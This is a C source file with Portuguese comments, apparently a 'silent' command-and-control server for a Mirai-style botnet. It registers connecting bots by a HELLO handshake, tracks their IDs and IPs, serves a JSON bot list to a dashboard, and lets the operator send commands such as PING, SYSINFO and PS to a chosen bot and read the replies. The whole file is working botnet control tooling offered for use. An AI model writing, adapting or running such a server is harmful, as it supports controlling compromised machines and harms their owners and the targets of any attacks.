// c2_server_mirai.c - Versão Silenciosa (Anti-Flood no Terminal)
// Compilar: gcc c2_server_mirai.c -o c2_server
// Uso: ./c2_server 5555

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <time.h>

#define MAX_BOTS 100
#define BUF_SIZE 2048

typedef struct {
    int fd;
    char id[64];
    char ip[INET_ADDRSTRLEN];
    time_t last_seen;
} bot_t;

// Função auxiliar para construir JSON manual
void send_bot_list_json(int fd, bot_t *bots, int count) {
    char json_buf[8192];
    strcpy(json_buf, "[");
    
    int first = 1;
    for (int i = 0; i < count; i++) {
        // Só lista bots reais (ignora slots vazios ou MONITOR)
        if (bots[i].fd > 0 && strcmp(bots[i].id, "MONITOR") != 0 && strcmp(bots[i].id, "UNKNOWN") != 0) {
            if (!first) strcat(json_buf, ",");
            
            char entry[256];
            int latency = (int)(time(NULL) - bots[i].last_seen); 
            
            snprintf(entry, sizeof(entry), 
                "{\"id\": \"%s\", \"ip\": \"%s\", \"last_seen\": \"%ld\", \"latency\": %d}",
                bots[i].id, bots[i].ip, bots[i].last_seen, latency);
            
            strcat(json_buf, entry);
            first = 0;
        }
    }
    strcat(json_buf, "]\n");
    send(fd, json_buf, strlen(json_buf), 0);
}

int main(int argc, char *argv[]) {
    int server_fd, port, max_fd;
    struct sockaddr_in addr;
    fd_set read_fds;
    bot_t bots[MAX_BOTS];
    int bot_count = 0;
    char buffer[BUF_SIZE];

    if (argc != 2) {
        fprintf(stderr, "Uso: %s <porta>\n", argv[0]);
        return 1;
    }

    port = atoi(argv[1]);
    memset(bots, 0, sizeof(bots));

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket"); return 1;
    }
    
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); return 1;
    }

    if (listen(server_fd, 10) < 0) {
        perror("listen"); return 1;
    }

    printf("[C2] Servidor pronto na porta %d (Modo Silencioso)\n", port);
    printf("[C2] Aguardando bots... (O Dashboard não vai gerar logs aqui)\n");

    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(server_fd, &read_fds);
        max_fd = server_fd;

        // Adiciona descritores à lista de leitura
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].fd > 0) {
                FD_SET(bots[i].fd, &read_fds);
                if (bots[i].fd > max_fd) max_fd = bots[i].fd;
            }
        }

        // Menu não bloqueante (truque simples usando select com timeout zero para stdin seria ideal, 
        // mas aqui mantemos o select de rede e checamos stdin depois ou aceitamos que o menu aparece nos logs)
        
        if (select(max_fd + 1, &read_fds, NULL, NULL, NULL) < 0) break;

        // 1. Nova conexão chegando
        if (FD_ISSET(server_fd, &read_fds)) {
            struct sockaddr_in cli_addr;
            socklen_t cli_len = sizeof(cli_addr);
            int new_fd = accept(server_fd, (struct sockaddr *)&cli_addr, &cli_len);
            
            if (new_fd >= 0) {
                if (bot_count < MAX_BOTS) {
                    bots[bot_count].fd = new_fd;
                    strcpy(bots[bot_count].id, "UNKNOWN");
                    inet_ntop(AF_INET, &(cli_addr.sin_addr), bots[bot_count].ip, INET_ADDRSTRLEN);
                    bots[bot_count].last_seen = time(NULL);
                    
                    // MODIFICAÇÃO: Só loga se NÃO for localhost (evita flood do monitor)
                    if (strcmp(bots[bot_count].ip, "127.0.0.1") != 0) {
                        printf("[C2] Nova conexão: %s (fd=%d)\n", bots[bot_count].ip, new_fd);
                    }
                    
                    bot_count++;
                } else {
                    close(new_fd);
                }
            }
        }

        // 2. Processar mensagens dos clientes
        for (int i = 0; i < bot_count; i++) {
            int fd = bots[i].fd;
            if (fd > 0 && FD_ISSET(fd, &read_fds)) {
                int n = recv(fd, buffer, sizeof(buffer)-1, 0);
                
                // Cliente desconectou
                if (n <= 0) {
                    // Só avisa desconexão se for bot real
                    if (strcmp(bots[i].ip, "127.0.0.1") != 0) {
                        printf("[C2] Bot desconectado: %s\n", bots[i].id);
                    }
                    close(fd);
                    bots[i].fd = -1;
                } 
                // Mensagem recebida
                else {
                    buffer[n] = '\0';
                    bots[i].last_seen = time(NULL);

                    // Verifica Handshake
                    if (strncmp(bots[i].id, "UNKNOWN", 7) == 0) {
                        if (strncmp(buffer, "HELLO ", 6) == 0) {
                            char *id_ptr = buffer + 6;
                            id_ptr[strcspn(id_ptr, "\r\n")] = 0;
                            
                            // SE FOR O DASHBOARD (MONITOR)
                            if (strcmp(id_ptr, "MONITOR") == 0) {
                                // NÃO printa nada aqui para evitar flood
                                send_bot_list_json(fd, bots, bot_count);
                                close(fd);
                                bots[i].fd = -1; // Libera o slot imediatamente
                            } 
                            // SE FOR BOT REAL
                            else {
                                strncpy(bots[i].id, id_ptr, sizeof(bots[i].id)-1);
                                send(fd, "OK\n", 3, 0);
                                printf("[C2] Bot REGISTRADO: %s\n", bots[i].id);
                                
                                // Re-imprime o menu para o usuário não se perder
                                printf("\nComandos: l (listar), s (selecionar), q (sair)\n> ");
                                fflush(stdout);
                            }
                        }
                    } else {
                        // Resposta de comando vindo de um Bot já registrado
                        printf("\n===== Resposta de %s =====\n%s\n==========================\n> ", bots[i].id, buffer);
                        fflush(stdout);
                    }
                }
            }
        }
        
        // Pequena verificação de entrada do teclado (Polling simples)
        struct timeval tv = {0, 0};
        fd_set input_fds;
        FD_ZERO(&input_fds);
        FD_SET(STDIN_FILENO, &input_fds);
        
        if (select(STDIN_FILENO + 1, &input_fds, NULL, NULL, &tv) > 0) {
             if (fgets(buffer, sizeof(buffer), stdin)) {
                if (buffer[0] == 'l') {
                    printf("\n--- Bots Conectados ---\n");
                    for (int k=0; k<bot_count; k++) {
                        if (bots[k].fd > 0 && strcmp(bots[k].ip, "127.0.0.1") != 0)
                            printf("[%d] ID: %s | IP: %s\n", k, bots[k].id, bots[k].ip);
                    }
                    printf("> "); fflush(stdout);
                } else if (buffer[0] == 's') {
                    printf("Índice do bot: "); fflush(stdout);
                    fgets(buffer, sizeof(buffer), stdin);
                    int idx = atoi(buffer);
                    if (idx >= 0 && idx < bot_count && bots[idx].fd > 0) {
                        printf("Comando para %s (PING/SYSINFO/PS): ", bots[idx].id); fflush(stdout);
                        char cmd[64];
                        fgets(cmd, sizeof(cmd), stdin);
                        send(bots[idx].fd, cmd, strlen(cmd), 0);
                        printf("[*] Comando enviado. Aguardando resposta...\n");
                    } else {
                        printf("[-] Índice inválido.\n> "); fflush(stdout);
                    }
                } else if (buffer[0] == 'q') {
                    break;
                }
             }
        }
    }
    return 0;
}
